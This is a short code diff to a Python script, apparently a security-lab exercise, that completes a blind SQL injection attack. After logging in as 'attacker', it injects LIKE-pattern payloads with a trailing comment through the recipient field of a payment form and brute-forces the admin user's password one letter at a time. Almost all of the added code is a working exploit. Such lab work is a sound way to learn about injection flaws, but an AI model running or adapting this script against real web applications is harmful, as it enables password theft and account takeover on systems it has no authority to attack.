@@ -18,13 +18,25 @@ def submit_pay_form(sess, recipient, amount):
                     data={
                         "recipient": recipient,
                         "amount": amount,
+                        "auth-token": sess.cookies["session"]
                     })
     return response.status_code == codes.ok
 
 def sqli_attack(username):
     sess = Session()
     assert(submit_login_form(sess, "attacker", "attacker"))
-    pass
+    prefix = ''
+    while True:
+        for char in 'abcdefghijklmnopqrstuvwxyz':
+            password = prefix + char
+            if submit_pay_form(sess, "{}' AND users.password LIKE '{}' --".format(username, password), '0'):
+                print(password)
+                return password
+            elif submit_pay_form(sess, "{}' AND users.password LIKE '{}%' --".format(username, password), '0'):
+                prefix = password
+                print('constructing in progress:', prefix)
+                break
+    return 'password not found'
 
 def main():
     sqli_attack("admin")
